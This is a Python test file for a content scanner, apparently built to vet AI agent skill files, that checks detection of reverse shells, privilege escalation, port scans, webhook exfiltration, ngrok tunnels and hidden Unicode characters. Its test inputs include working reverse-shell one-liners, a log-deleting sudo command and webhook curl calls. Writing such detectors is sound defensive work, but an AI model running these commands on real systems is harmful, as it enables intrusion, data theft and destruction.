"""Tests for extended detection patterns."""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from clawhub_bridge.scanner import scan_content, scan_file

FIXTURES = Path(__file__).parent / "fixtures"


def test_reverse_shell_bash():
    content = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "bash_reverse_shell" in names
    assert result.verdict == "FAIL"


def test_reverse_shell_netcat():
    content = "nc -e /bin/bash 10.0.0.1 4444"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "nc_reverse_shell" in names


def test_reverse_shell_python():
    content = "socket.connect(('10.0.0.1', 4444)) subprocess.call(['/bin/sh'])"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "python_reverse_shell" in names


def test_reverse_shell_fixture():
    result = scan_file(str(FIXTURES / "reverse_shell_skill.md"))
    assert result.verdict == "FAIL"
    names = {f.pattern_name for f in result.findings}
    assert "bash_reverse_shell" in names
    assert "nc_reverse_shell" in names


def test_privilege_escalation_sudo():
    content = "sudo rm -r /var/log"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "sudo_doas" in names


def test_privilege_escalation_setuid():
    content = "chmod u+s /usr/local/bin/backdoor"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "setuid_chmod" in names


def test_crontab_persistence():
    content = "crontab -e"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "crontab_persist" in names


def test_port_scan_nmap():
    content = "nmap -sV 192.168.1.0/24"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "port_scan" in names


def test_port_scan_masscan():
    content = "masscan 10.0.0.0/8 -p80,443"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "port_scan" in names


def test_packet_capture():
    content = "tcpdump -i eth0 -w /tmp/capture.pcap"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "packet_capture" in names


def test_recon_fixture():
    result = scan_file(str(FIXTURES / "recon_skill.md"))
    assert result.verdict in ("REVIEW", "FAIL")
    names = {f.pattern_name for f in result.findings}
    assert "sudo_doas" in names
    assert "port_scan" in names
    assert "packet_capture" in names


def test_discord_webhook():
    content = "curl https://discord.com/api/webhooks/123456789/ABCtoken"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "discord_webhook" in names
    assert result.verdict == "FAIL"


def test_slack_webhook():
    content = "curl https://hooks.slack.com/services/T0ABC1234/B0DEF5678/secret"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "slack_webhook" in names


def test_telegram_bot_token():
    content = "curl https://api.telegram.org/bot123456:ABC-DEF_ghi/sendMessage"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "telegram_bot_api" in names


def test_ngrok_tunnel():
    content = "ngrok http 8080"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "ngrok_tunnel" in names


def test_webhook_fixture():
    result = scan_file(str(FIXTURES / "webhook_exfil_skill.md"))
    assert result.verdict == "FAIL"
    names = {f.pattern_name for f in result.findings}
    assert "discord_webhook" in names
    assert "slack_webhook" in names


def test_bidi_override():
    content = "normal text \u202e hidden reversed text"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "bidi_override" in names
    assert result.verdict == "FAIL"


def test_zero_width_chars():
    content = "innocent\u200b\u200b\u200b\u200btext"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "zero_width_chars" in names


def test_clean_skill_no_extended_findings():
    result = scan_file(str(FIXTURES / "clean_skill.md"))
    assert result.verdict == "PASS"
    assert len(result.findings) == 0


if __name__ == "__main__":
    tests = [v for k, v in globals().items() if k.startswith("test_")]
    passed = 0
    failed = 0
    for test in tests:
        try:
            test()
            print(f"  PASS  {test.__name__}")
            passed += 1
        except AssertionError as e:
            print(f"  FAIL  {test.__name__}: {e}")
            failed += 1
        except Exception as e:
            print(f"  FAIL  {test.__name__}: {type(e).__name__}: {e}")
            failed += 1
    print(f"\n{passed} passed, {failed} failed")
    sys.exit(1 if failed else 0)
